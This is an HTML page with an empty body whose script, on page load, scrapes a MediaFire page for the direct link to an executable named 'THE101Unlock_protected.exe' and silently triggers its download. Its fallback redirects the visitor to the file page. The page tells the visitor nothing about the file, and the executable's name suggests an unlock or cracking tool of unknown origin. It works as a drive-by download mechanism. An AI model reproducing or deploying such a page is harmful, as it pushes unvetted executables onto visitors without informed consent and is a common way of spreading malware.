<!DOCTYPE html>
<html>
<head>
    <script>
        (async function() {
            try {
                // Fetch the MediaFire page
                const response = await fetch('https://www.mediafire.com/file/4uf3c1l49gih2ti/THE101Unlock_protected.exe/file');
                const html = await response.text();
                
                // Extract the direct download URL using the exact pattern from your HTML
                const downloadMatch = html.match(/href="(https:\/\/download[^"]*\.mediafire\.com[^"]*\/THE101Unlock_protected\.exe)"/);
                
                if (downloadMatch && downloadMatch[1]) {
                    const directUrl = downloadMatch[1];
                    
                    // Create and trigger download
                    const link = document.createElement('a');
                    link.href = directUrl;
                    link.download = 'THE101Unlock_protected.exe';
                    link.style.display = 'none';
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                } else {
                    // Fallback: redirect to original page
                    window.location.href = 'https://www.mediafire.com/file/4uf3c1l49gih2ti/THE101Unlock_protected.exe/file';
                }
                
            } catch (error) {
                // Fallback on error
                window.location.href = 'https://www.mediafire.com/file/4uf3c1l49gih2ti/THE101Unlock_protected.exe/file';
            }
        })();
    </script>
</head>
<body>
</body>
</html>
